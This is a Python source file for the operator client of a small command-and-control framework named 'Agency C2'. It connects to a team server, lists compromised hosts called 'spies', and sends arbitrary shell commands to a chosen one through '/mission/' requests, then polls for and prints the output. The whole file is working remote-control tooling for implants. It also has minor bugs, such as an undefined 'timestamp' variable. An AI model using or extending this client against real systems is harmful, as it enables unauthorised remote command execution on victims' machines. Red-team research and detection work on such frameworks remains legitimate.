import requests
import argparse
import time
import threading
from datetime import datetime


def poll_for_output(server, agent):
	while True:
		response = requests.get(f"{server}/spy/{agent}")
		if response.status_code == 200:
			task_output = response.json().get('output')
			if task_output !="":
				print(task_output)
				requests.get(server+"/cls/"+str(agent))
		time.sleep(3)  # Poll every 3 seconds, adjust as needed

def menu(ip, port, name):
	server="http://"+ip+":"+str(port)
	agent=0
	prompt="Agency C2 Client "+name+" $ > "
	while(True):
	#	if agent != 0:
	#		response=requests.get(server+"/spy/"+str(agent)).json()
	#		task_output=response.get('output')
	#		if task_output != "":
	#			print(task_output)
	#			requests.get(server+"/cls/"+str(agent))
		command = input(prompt)
		print("\n\n")
		if "list" in command:
			response=requests.get(server+"/spies").text
			response = response.replace("<p>","")
			response = response.replace("</p>","")
			response = response.replace("<br>","\n")
			print(response)
			continue
		if "spy" in command:
			id=command[4:]
			agent=id
			print(agent)
			prompt="Spy "+str(agent)+" # >"
			command = input(prompt)
			print("\n\n")
			threading.Thread(target=poll_for_output, args=(server, agent), daemon=True).start()
			continue
		if "shell" in command:
			if agent==0:
				print("["+timestamp+"]"+" Please select a spy first\n\n")				
				continue
			else:
				cmd=command[6:]
				requests.get(server+"/mission/"+str(agent)+"/"+cmd)
				poll_for_output(server, agent) 
				continue
		if "help" in command:
			help()
			continue
		if "exit" in command:
			exit()
			continue



def help():
	print("\nHelp Menu")
	print("===Command===")
	print("list: List all active spies")
	print("spy <id>: Select spy No.id")
	print("shell <command>: Execute command and display the output")
	print("help: Display this menu")
	print("exit: Exit Agency C2 Client\n\n")
	return



if __name__ == "__main__":
	parser = argparse.ArgumentParser()
	parser.add_argument('--ip', '-i',required=True,dest='ip',help='Team server IP')
	parser.add_argument('--port', '-p',required=True,dest='port',help='Port of the listener')
	parser.add_argument('--name', '-n',required=True,dest='name',help='Name of the operator')
#	parser.add_argument('--key', '-k',required=True,dest='key',help='Key to authenticate to the team server')
	parser.add_argument('--verbose', '-v',help='Print more data',action='store_true')	
	args = parser.parse_args()
#	key=args.key
	ip=args.ip
	port=args.port
	name=args.name

	print("[+] Connected to the team server")
	menu(ip, port, name)